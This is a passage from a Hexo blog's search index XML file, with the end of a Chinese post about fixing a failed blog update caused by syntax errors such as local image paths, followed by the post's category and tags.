d就更新成功了。</p><p>问题的原因应该是这次发布成功之后最近一次发布，里面写的语法有错误，比如图片没有上传用的本地图片等。</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
